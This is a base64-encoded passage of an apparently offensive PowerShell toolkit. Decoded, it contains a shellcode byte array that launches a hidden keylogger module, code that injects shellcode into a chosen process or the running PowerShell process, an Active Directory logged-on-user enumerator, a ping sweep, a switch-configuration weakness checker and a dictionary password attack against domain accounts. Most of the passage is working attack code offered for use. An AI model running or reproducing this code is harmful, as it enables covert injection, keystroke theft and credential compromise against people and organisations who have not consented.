DhiLDB4ODAsMHg4OCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDAsMHgwLDB4MCwweDQ4LDB4ODUsMHhjMCwweDc0LDB4NjcsMHg0OCwweDEsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHhkMCwweDUwLDB4OGIsMHg0OCwweDE4LDB4NDQsMHg4YiwweDQwLDB4MjAsMHg0OSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDEsMHhkMCwweGUzLDB4NTYsMHg0OCwweGZmLDB4YzksMHg0MSwweDhiLDB4MzQsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHg4OCwweDQ4LDB4MSwweGQ2LDB4NGQsMHgzMSwweGM5LDB4NDgsMHgzMSwweGMwLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4YWMsMHg0MSwweGMxLDB4YzksMHhkLDB4NDEsMHgxLDB4YzEsMHgzOCwweGUwLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4NzUsMHhmMSwweDRjLDB4MywweDRjLDB4MjQsMHg4LDB4NDUsMHgzOSwweGQxLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4NzUsMHhkOCwweDU4LDB4NDQsMHg4YiwweDQwLDB4MjQsMHg0OSwweDEsMHhkMCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDY2LDB4NDEsMHg4YiwweGMsMHg0OCwweDQ0LDB4OGIsMHg0MCwweDFjLDB4NDksCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgxLDB4ZDAsMHg0MSwweDhiLDB4NCwweDg4LDB4NDgsMHgxLDB4ZDAsMHg0MSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDU4LDB4NDEsMHg1OCwweDVlLDB4NTksMHg1YSwweDQxLDB4NTgsMHg0MSwweDU5LAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4NDEsMHg1YSwweDQ4LDB4ODMsMHhlYywweDIwLDB4NDEsMHg1MiwweGZmLDB4ZTAsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHg1OCwweDQxLDB4NTksMHg1YSwweDQ4LDB4OGIsMHgxMiwweGU5LDB4NTcsMHhmZiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweGZmLDB4ZmYsMHg1ZCwweDQ4LDB4YmEsMHgxLDB4MCwweDAsMHgwLDB4MCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDAsMHgwLDB4MCwweDQ4LDB4OGQsMHg4ZCwweDEsMHgxLDB4MCwweDAsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHg0MSwweGJhLDB4MzEsMHg4YiwweDZmLDB4ODcsMHhmZiwweGQ1LDB4YmIsMHhlMCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDFkLDB4MmEsMHhhLDB4NDEsMHhiYSwweGE2LDB4OTUsMHhiZCwweDlkLDB4ZmYsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHhkNSwweDQ4LDB4ODMsMHhjNCwweDI4LDB4M2MsMHg2LDB4N2MsMHhhLDB4ODAsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHhmYiwweGUwLDB4NzUsMHg1LDB4YmIsMHg0NywweDEzLDB4NzIsMHg2ZiwweDZhLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MCwweDU5LDB4NDEsMHg4OSwweGRhLDB4ZmYsMHhkNSwweDUwLDB4NmYsMHg3NywKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDY1LDB4NzIsMHg1MywweDY4LDB4NjUsMHg2YywweDZjLDB4MjAsMHgyZCwweDc3LAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4NjksMHg2ZSwweDY0LDB4NmYsMHg3NywweDczLDB4NzQsMHg3OSwweDZjLDB4NjUsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgyMCwweDY4LDB4NjksMHg2NCwweDY0LDB4NjUsMHg2ZSwweDIwLDB4MmQsMHg2NSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDc4LDB4NjUsMHg2MywweDIwLDB4NjIsMHg3OSwweDcwLDB4NjEsMHg3MywweDczLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MjAsMHg0OSwweDZkLDB4NzAsMHg2ZiwweDcyLDB4NzQsMHgyZCwweDRkLDB4NmYsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHg2NCwweDc1LDB4NmMsMHg2NSwweDIwLDB4NDMsMHgzYSwweDVjLDB4NTAsMHg3MiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDY5LDB4NmUsMHg2MywweDY1LDB4NTAsMHg2ZiwweDc3LDB4NjUsMHg3MiwweDJlLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4NzAsMHg3MywweDZkLDB4MzEsMHgyMCwweDNiLDB4MjAsMHg1MywweDc0LDB4NjEsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHg3MiwweDc0LDB4MmQsMHg0YiwweDY1LDB4NzksMHg0YywweDZmLDB4NjcsMHg2NywKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDY1LDB4NzIsMHgwKQogICAgfQoKICAgIGlmICggJFBTQm91bmRQYXJhbWV0ZXJzWydQcm9jZXNzSUQnXSApCiAgICB7CiAgICAgICAgIyBJbmplY3Qgc2hlbGxjb2RlIGludG8gdGhlIHNwZWNpZmllZCBwcm9jZXNzIElECiAgICAgICAgJE9wZW5Qcm9jZXNzQWRkciA9IEdldC1Qcm9jQWRkcmVzcyBrZXJuZWwzMi5kbGwgT3BlblByb2Nlc3MKICAgICAgICAkT3BlblByb2Nlc3NEZWxlZ2F0ZSA9IEdldC1EZWxlZ2F0ZVR5cGUgQChbVUludDMyXSwgW0Jvb2xdLCBbVUludDMyXSkgKFtJbnRQdHJdKQogICAgICAgICRPcGVuUHJvY2VzcyA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKCRPcGVuUHJvY2Vzc0FkZHIsICRPcGVuUHJvY2Vzc0RlbGVnYXRlKQogICAgICAgICRWaXJ0dWFsQWxsb2NFeEFkZHIgPSBHZXQtUHJvY0FkZHJlc3Mga2VybmVsMzIuZGxsIFZpcnR1YWxBbGxvY0V4CiAgICAgICAgJFZpcnR1YWxBbGxvY0V4RGVsZWdhdGUgPSBHZXQtRGVsZWdhdGVUeXBlIEAoW0ludFB0cl0sIFtJbnRQdHJdLCBbVWludDMyXSwgW1VJbnQzMl0sIFtVSW50MzJdKSAoW0ludFB0cl0pCiAgICAgICAgJFZpcnR1YWxBbGxvY0V4ID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJFZpcnR1YWxBbGxvY0V4QWRkciwgJFZpcnR1YWxBbGxvY0V4RGVsZWdhdGUpCiAgICAgICAgJFdyaXRlUHJvY2Vzc01lbW9yeUFkZHIgPSBHZXQtUHJvY0FkZHJlc3Mga2VybmVsMzIuZGxsIFdyaXRlUHJvY2Vzc01lbW9yeQogICAgICAgICRXcml0ZVByb2Nlc3NNZW1vcnlEZWxlZ2F0ZSA9IEdldC1EZWxlZ2F0ZVR5cGUgQChbSW50UHRyXSwgW0ludFB0cl0sIFtCeXRlW11dLCBbVUludDMyXSwgW1VJbnQzMl0uTWFrZUJ5UmVmVHlwZSgpKSAoW0Jvb2xdKQogICAgICAgICRXcml0ZVByb2Nlc3NNZW1vcnkgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkV3JpdGVQcm9jZXNzTWVtb3J5QWRkciwgJFdyaXRlUHJvY2Vzc01lbW9yeURlbGVnYXRlKQogICAgICAgICRDcmVhdGVSZW1vdGVUaHJlYWRBZGRyID0gR2V0LVByb2NBZGRyZXNzIGtlcm5lbDMyLmRsbCBDcmVhdGVSZW1vdGVUaHJlYWQKICAgICAgICAkQ3JlYXRlUmVtb3RlVGhyZWFkRGVsZWdhdGUgPSBHZXQtRGVsZWdhdGVUeXBlIEAoW0ludFB0cl0sIFtJbnRQdHJdLCBbVUludDMyXSwgW0ludFB0cl0sIFtJbnRQdHJdLCBbVUludDMyXSwgW0ludFB0cl0pIChbSW50UHRyXSkKICAgICAgICAkQ3JlYXRlUmVtb3RlVGhyZWFkID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJENyZWF0ZVJlbW90ZVRocmVhZEFkZHIsICRDcmVhdGVSZW1vdGVUaHJlYWREZWxlZ2F0ZSkKICAgICAgICAkQ2xvc2VIYW5kbGVBZGRyID0gR2V0LVByb2NBZGRyZXNzIGtlcm5lbDMyLmRsbCBDbG9zZUhhbmRsZQogICAgICAgICRDbG9zZUhhbmRsZURlbGVnYXRlID0gR2V0LURlbGVnYXRlVHlwZSBAKFtJbnRQdHJdKSAoW0Jvb2xdKQogICAgICAgICRDbG9zZUhhbmRsZSA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKCRDbG9zZUhhbmRsZUFkZHIsICRDbG9zZUhhbmRsZURlbGVnYXRlKQogICAgCiAgICAgICAgV3JpdGUtVmVyYm9zZSAiSW5qZWN0aW5nIHNoZWxsY29kZSBpbnRvIFBJRDogJFByb2Nlc3NJZCIKICAgICAgICAKICAgICAgICBpZiAoICRGb3JjZSAtb3IgJHBzQ21kbGV0LlNob3VsZENvbnRpbnVlKCAnRG8geW91IHdpc2ggdG8gY2Fycnkgb3V0IHlvdXIgZXZpbCBwbGFucz8nLAogICAgICAgICAgICAgICAgICJJbmplY3Rpbmcgc2hlbGxjb2RlIGluamVjdGluZyBpbnRvICQoKEdldC1Qcm9jZXNzIC1JZCAkUHJvY2Vzc0lkKS5Qcm9jZXNzTmFtZSkgKCRQcm9jZXNzSWQpISIgKSApCiAgICAgICAgewogICAgICAgICAgICBJbmplY3QtUmVtb3RlU2hlbGxjb2RlICRQcm9jZXNzSWQKICAgICAgICB9CiAgICB9CiAgICBlbHNlCiAgICB7CiAgICAgICAgIyBJbmplY3Qgc2hlbGxjb2RlIGludG8gdGhlIGN1cnJlbnRseSBydW5uaW5nIFBvd2VyU2hlbGwgcHJvY2VzcwogICAgICAgICRWaXJ0dWFsQWxsb2NBZGRyID0gR2V0LVByb2NBZGRyZXNzIGtlcm5lbDMyLmRsbCBWaXJ0dWFsQWxsb2MKICAgICAgICAkVmlydHVhbEFsbG9jRGVsZWdhdGUgPSBHZXQtRGVsZWdhdGVUeXBlIEAoW0ludFB0cl0sIFtVSW50MzJdLCBbVUludDMyXSwgW1VJbnQzMl0pIChbSW50UHRyXSkKICAgICAgICAkVmlydHVhbEFsbG9jID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJFZpcnR1YWxBbGxvY0FkZHIsICRWaXJ0dWFsQWxsb2NEZWxlZ2F0ZSkKICAgICAgICAkVmlydHVhbEZyZWVBZGRyID0gR2V0LVByb2NBZGRyZXNzIGtlcm5lbDMyLmRsbCBWaXJ0dWFsRnJlZQogICAgICAgICRWaXJ0dWFsRnJlZURlbGVnYXRlID0gR2V0LURlbGVnYXRlVHlwZSBAKFtJbnRQdHJdLCBbVWludDMyXSwgW1VJbnQzMl0pIChbQm9vbF0pCiAgICAgICAgJFZpcnR1YWxGcmVlID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJFZpcnR1YWxGcmVlQWRkciwgJFZpcnR1YWxGcmVlRGVsZWdhdGUpCiAgICAgICAgJENyZWF0ZVRocmVhZEFkZHIgPSBHZXQtUHJvY0FkZHJlc3Mga2VybmVsMzIuZGxsIENyZWF0ZVRocmVhZAogICAgICAgICRDcmVhdGVUaHJlYWREZWxlZ2F0ZSA9IEdldC1EZWxlZ2F0ZVR5cGUgQChbSW50UHRyXSwgW1VJbnQzMl0sIFtJbnRQdHJdLCBbSW50UHRyXSwgW1VJbnQzMl0sIFtJbnRQdHJdKSAoW0ludFB0cl0pCiAgICAgICAgJENyZWF0ZVRocmVhZCA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKCRDcmVhdGVUaHJlYWRBZGRyLCAkQ3JlYXRlVGhyZWFkRGVsZWdhdGUpCiAgICAgICAgJFdhaXRGb3JTaW5nbGVPYmplY3RBZGRyID0gR2V0LVByb2NBZGRyZXNzIGtlcm5lbDMyLmRsbCBXYWl0Rm9yU2luZ2xlT2JqZWN0CiAgICAgICAgJFdhaXRGb3JTaW5nbGVPYmplY3REZWxlZ2F0ZSA9IEdldC1EZWxlZ2F0ZVR5cGUgQChbSW50UHRyXSwgW0ludDMyXSkgKFtJbnRdKQogICAgICAgICRXYWl0Rm9yU2luZ2xlT2JqZWN0ID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJFdhaXRGb3JTaW5nbGVPYmplY3RBZGRyLCAkV2FpdEZvclNpbmdsZU9iamVjdERlbGVnYXRlKQogICAgICAgIAogICAgICAgIFdyaXRlLVZlcmJvc2UgIkluamVjdGluZyBzaGVsbGNvZGUgaW50byBQb3dlclNoZWxsIgogICAgICAgIAogICAgICAgIGlmICggJEZvcmNlIC1vciAkcHNDbWRsZXQuU2hvdWxkQ29udGludWUoICdEbyB5b3Ugd2lzaCB0byBjYXJyeSBvdXQgeW91ciBldmlsIHBsYW5zPycsCiAgICAgICAgICAgICAgICAgIkluamVjdGluZyBzaGVsbGNvZGUgaW50byB0aGUgcnVubmluZyBQb3dlclNoZWxsIHByb2Nlc3MhIiApICkKICAgICAgICB7CiAgICAgICAgICAgIEluamVjdC1Mb2NhbFNoZWxsY29kZQogICAgICAgIH0KICAgIH0gICAKfQokRXhwbG9yZXJQUyA9IEdldC1Qcm9jZXNzIC1OYW1lIGV4cGxvcmVyCltVSW50MTZdJEV4cGxvcmVyUFMgPSAkRXhwbG9yZXJQUy5JZAoKZnVuY3Rpb24gUHNMb2dnZWRvbnsKPCMgICAgW0NtZGxldEJpbmRpbmcoKV1wYXJhbSAoCgogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAxLCBNYW5kYXRvcnk9JHRydWUpXQogICAgICAgIFtQU0NyZWRlbnRpYWxdCiAgICAgICAgJFVzZXJuYW1lLAogICAgICAgIAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAyLCBNYW5kYXRvcnk9JHRydWUpXQogICAgICAgIFtQU0NyZWRlbnRpYWxdCiAgICAgICAgJFBhc3N3b3JkCiAgICAgICAgCiAgICAgICAgICAgICAgIAogICAgICAgCiAgICAgICAgKQojPgoKPCMKICAgIC5TWU5PUFNJUwogICAgVGhpcyBXaWxsIFNob3cgeW91IHdpY2ggdXNlciB3b3JrcyBpcyBpbiB3aGljaCBjb21wdXRlciAoQmUgQXdhcmUgdXNlIHRoaXMganVzdCBvbiBEb21haW4gQ29udHJvbGxlcikgISEhCgogICAgIEF1dGhvcjogUHJpbmNlJTAwCiAgICAgICAgCiAgICAuRVhBTVBMRQogICAgIFBTPlBzTG9nZ2Vkb24gCgogICAgLkxJTksKICAgICBodHRwczovL2dpdGh1Yi5jb20vUHJpbmNlLUFtaXIvT2ZmZW5zaXZlLVBvd2Vyc2hlbGwKIz4KICAgICRrZXkgPSDDouKCrMWTSEtMTTpcU09GVFdBUkVcTWljcm9zb2Z0XFBvd2VyU2hlbGxcMVxTaGVsbElkc8Oi4oKsCiAgICBTZXQtSXRlbVByb3BlcnR5ICRrZXkgQ29uc29sZVByb21wdGluZyBUcnVlCiAgICAkVXNlcm5hbWUgPSBSZWFkLUhvc3QgIkRvbWFpbkFkbWluVXNlcm5hbWUgIgogICAgJFBhc3N3b3JkID0gUmVhZC1Ib3N0ICJEb21haW5BZG1pblBhc3N3b3JkICIgLUFzU2VjdXJlU3RyaW5nCiAgICAkY3JlZCA9IG5ldy1vYmplY3QgU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWwoJFVzZXJuYW1lLCRQYXNzd29yZCkKICAgICRjb21wdXRlcnMgPSBHZXQtQURDb21wdXRlciAtQ3JlZGVudGlhbCAkY3JlZCAtRmlsdGVyIHsoZW5hYmxlZCAtZXEgInRydWUiKSB9IHwgU2VsZWN0LU9iamVjdCAtRXhwYW5kUHJvcGVydHkgTmFtZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSAKICAgICRvdXRwdXQgPSBAKCkKICAgIEZvcmVhY2ggKCRQU0l0ZW0gaW4gJGNvbXB1dGVycyl7CiAgICAgICAgJFVzZXIgPSBHZXQtV21pT2JqZWN0IC1DbGFzcyBXaW4zMl9Db21wdXRlclN5c3RlbSAtQ29tcHV0ZXJOYW1lICRQU0l0ZW0gfCBTZWxlY3QtT2JqZWN0IC1FeHBhbmRQcm9wZXJ0eSBVc2VybmFtZQogICAgICAgICRvYmogPSBOZXctT2JqZWN0IC1UeXBlTmFtZSBQU09iamVjdCAtUHJvcGVydHkgQHsKICAgICAgICAgICAgIkNvbXB1dGVyIiA9ICRQU0l0ZW0KICAgICAgICAgICAgIlVzZXIiID0gJFVzZXIKICAgICAgICB9CiAgICAkb3V0cHV0Kz0kb2JqCiAgICB9Cn0KCmZ1bmN0aW9uIE5ldHdvcmtTdGF0dXN7CiAgICBbQ21kbGV0QmluZGluZygpXXBhcmFtICgKCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDEsIE1hbmRhdG9yeT0kdHJ1ZSldCiAgICAgICAgJElQTGlzdCAgICAgICAKICAgICAgICApCgogICAgQkVHSU57JElQTGlzdCA9IEdldC1Db250ZW50ICRJUExpc3R9CgogICAgUFJPQ0VTU3sKICAgICAgICBmb3JlYWNoICgkaXAgaW4gJElQTGlzdCl7CiAgICAgICAgICAgICRwaW5nID0gcGluZyAtbiAyICRpcAoKICAgICAgICAgICAgaWYgKCRwaW5nIC1tYXRjaCAiVFRMPTEyOCIpewogICAgICAgICAgICAgICAgV3JpdGUtSG9zdCAiJGlwIGlzIHlvdXIgTmVpZ2hib3VyIiAtQmFja2dyb3VuZENvbG9yIEJsYWNrIC1Gb3JlZ3JvdW5kQ29sb3IgUmVkCiAgICAgICAgICAgICAgICAjV3JpdGUtUHJvZ3Jlc3MgLWFjdGl2aXR5ICJBZGRpbmcgRmlsZSBTaXplcyIgLXN0YXR1cyAiUGVyY2VudCBhZGRlZDogIiAtcGVyY2VudENvbXBsZXRlICgoJGlwIC8gJHBpbmcubGVuZ3RoKSAgKiAxMDApCiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZXt9CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgfQoKICAgIH0KCn0KCmZ1bmN0aW9uIFN3aXRjaC1WdWxuZXJhYmlsaXR5QXNzZXNtZW50ewo8IwogICAgLlNZTk9QU0lTCiAgICBUaGlzIHNjcmlwdCB3aWxsIHRlbGwgeW91LCB5b3VyIHN3aXRjaCB2dWxuZXJhYmlsaXRpZXMKCiAgICBBdXRob3I6IFByaW5jZSUwMAogICAgICAgIAogICAgLlBBUkFNRVRFUiBDb25maWcKICAgIFlvdXIgc3dpdGNoIENvbmZpZ3VyYXRpb24gZmlsZS4gCgogICAgLlBBUkFNRVRFUiBJUAogICAgSVAgQWRkcmVzcyBvZiBjdXJyZW50IHN3aXRjaC4KCiAgICAuRVhBTVBMRQogICAgIFN3aXRjaC1WdWxuZXJhYmlsaXR5QXNzZXNtZW50IC1Db25maWcgQzpcQ29uZmlnLnR4dCAtSVAgMTkyLjE2OC4yMC4xMCAKCiAgICAuTElOSwogICAgIGh0dHBzOi8vZ2l0aHViLmNvbS9QcmluY2UtQW1pci9PZmZlbnNpdmUtUG93ZXJzaGVsbC5naXQKIz4KICAgIFtDbWRsZXRCaW5kaW5nKCldcGFyYW0gKAoKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMSwgTWFuZGF0b3J5PSR0cnVlKV0KICAgICAgICAkQ29uZmlnLAogICAgICAgIAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAyLCBNYW5kYXRvcnk9JHRydWUpXQogICAgICAgIFtzdHJpbmddCiAgICAgICAgJElQICAgICAgIAogICAgICAgIAogICAgICAgICkKCgoKICAgICRDb25maWcgPSBHZXQtQ29udGVudCAkQ29uZmlnCgogICAgaWYgKCRDb25maWcgLW5vdGNvbnRhaW5zICdubyBjZHAnKXsKICAgICAgICBXcml0ZS1Ib3N0ICIkSVAgaXMgdnVsbmVyYWJsZSB0byBDRFBEb1MgQXR0YWNrLi4uICIgLUZvcmVncm91bmRDb2xvciBSZWQgLUJhY2tncm91bmRDb2xvciBCbGFjawogICAgfQoKCiAgICBpZiAoJENvbmZpZyAtbm90Y29udGFpbnMgJ2xvZ2luIGJsb2NrLWZvcicpewogICAgICAgIFdyaXRlLUhvc3QgIiRJUCBpcyB2dWxuZXJhYmxlIHRvIEJydXRlZm9yY2UgQXR0YWNrLi4uICIgLUZvcmVncm91bmRDb2xvciBSZWQgLUJhY2tncm91bmRDb2xvciBCbGFjawogICAgfQoKCgogICAgaWYgKCRDb25maWcgLW5vdGNvbnRhaW5zICdwb3J0LXNlY3VyaXR5Jyl7CiAgICAgICAgV3JpdGUtSG9zdCAiJElQIGlzIHZ1bG5lcmFibGUgdG8gTUFDb2YgQXR0YWNrLi4uICIgLUZvcmVncm91bmRDb2xvciBSZWQgLUJhY2tncm91bmRDb2xvciBCbGFjawogICAgfQoKCiAgICBpZiAoJENvbmZpZyAtbm90Y29udGFpbnMgJ2JwZHVndWFyZCcpewogICAgICAgIFdyaXRlLUhvc3QgIiRJUCBpcyB2dWxuZXJhYmxlIHRvIEJQRFVEb1MgQXR0YWNrLi4uICIgLUZvcmVncm91bmRDb2xvciBSZWQgLUJhY2tncm91bmRDb2xvciBCbGFjawogICAgfQoKCiAgICBpZiAoJENvbmZpZyAtbm90Y29udGFpbnMgJ3Nub29waW5nJyl7CiAgICAgICAgV3JpdGUtSG9zdCAiJElQIGlzIHZ1bG5lcmFibGUgdG8gREhDUCBBdHRhY2tzLi4uICIgLUZvcmVncm91bmRDb2xvciBSZWQgLUJhY2tncm91bmRDb2xvciBCbGFjawogICAgfQoKCiAgICBpZiAoJENvbmZpZyAtbm90Y29udGFpbnMgJ2luc3BlY3Rpb24nKXsKICAgICAgICBXcml0ZS1Ib3N0ICIkSVAgaXMgdnVsbmVyYWJsZSB0byBBcnAtU3Bvb2ZpbmcgQXR0YWNrLi4uICIgLUZvcmVncm91bmRDb2xvciBSZWQgLUJhY2tncm91bmRDb2xvciBCbGFjawogICAgfQoKCiAgICBpZiAoJENvbmZpZyAtbm90Y29udGFpbnMgJ3NwYW5uaW5nLXRyZWUgZ3VhcmQgcm9vdCcpewogICAgICAgIFdyaXRlLUhvc3QgIiRJUCBpcyB2dWxuZXJhYmxlIHRvIHNwYW5uaW5nLXRyZWUtcm9vdCBBdHRhY2suLi4gIiAtRm9yZWdyb3VuZENvbG9yIFJlZCAtQmFja2dyb3VuZENvbG9yIEJsYWNrCiAgICB9CgoKfQoKZnVuY3Rpb24gQURVc2VyUGFzcy1BdHRhY2t7CjwjCiAgICAuU1lOT1BTSVMKICAgIFRoaXMgU2NyaXB0IGlzIGZvciBkaWN0aW9uYXJ5IEF0dGFjayBpbiBBY3RpdmVEaXJlY3RvcnkgZm9yIGVhY2ggdXNlciBieSBnaXZlbiBwYXNzd29yZGZpbGUKCiAgICBBdXRob3I6IFByaW5jZSUwMAogICAgICAgIAogICAgLlBBUkFNRVRFUiBVc2VyRmlsZVBhdGgKICAgIHBhbGNlIGZvciBzYXZpbmcgdXNlcmZpbGUuIAoKICAgIC5QQVJBTUVURVIgUGFzc3dvcmRGaWxlcGF0aAogICAgWW91ciBnaXZlbiBwYXNzd29yZCBmaWxlLgoKICAgIC5FWEFNUExFCiAgICAgQURVc2VyUGFzcy1BdHRhY2sgLVVzZXJGaWxlUGF0aCBDOlxVc2Vycy50eHQgLVBhc3N3b3JkRmlsZXBhdGggQzpcUGFzc3dvcmRzIAoKICAgIC5MSU5LCiAgICAgaHR0cHM6Ly9naXRodWIuY29tL1ByaW5jZS1BbWlyL09mZmVuc2l2ZS1Qb3dlcnNoZWxsLmdpdAojPgogICAgW0NtZGxldEJpbmRpbmcoKV1wYXJhbSAoCgogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAxLCBNYW5kYXRvcnk9JHRydWUpXQogICAgICAgICRVc2VyRmlsZVBhdGgsCiAgICAgICAgCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDIsIE1hbmRhdG9yeT0kdHJ1ZSldCiAgICAgICAgW3N0cmluZ10KICAgICAgICAkUGFzc3dvcmRGaWxlcGF0aCAgICAgICAKICAgICAgICAKICAgICAgICApCgogZHNxdWVyeSB1c2VyIC1saW1pdCAwID4gJFVzZXJGaWxlUGF0aApmb3JlYWNoICgkRkROIGluICBHZXQtQ29udGVudCAkVXNlckZpbGVQYXRoKQp7CgogICAgJHJlcyA9IGRzZ2V0IHVzZXIgJEZETiAtc2FtaWQgCiAgICAkc2FtaWQgPSAkcmVzWzFdLnJlcGxhY2UoIiAiLCIiICkKICAgIGVjaG8gJHNhbWlkCiAgICBmb3JlYWNoICgkcGFzc3dvcmRzIGluIEdldC1Db250ZW50ICRQYXNzd29yZEZpbGVwYXRoKQogICAgewoKICAgICAgICAkcGFzc3dvcmRzID0gJHBhc3N3b3Jkcy5SZXBsYWNlKCIgIiwgIiIpCiAgICAgICAgCWRzZ2V0IHVzZXIgJEZETiAtdSAkc2FtaWQgLXAgJHBhc3N3b3JkcyA+ICRudWxsCiAgICAgICAgaWYgKCQ/KSB7CiAgICAgICAgICAgIFdyaXRlLUhvc3QgIkFjY291bnQ6ICRzYW1pZCBQYXNzd29yZDogJHBhc3N3b3JkcyIgLUJhY2tncm91bmRDb2xvciBibGFjayAtRm9yZWdyb3VuZENvbG9yIGdyZWVuCiAgICAgICAgfQoKICAgIH0KfQoKCn0KCg==
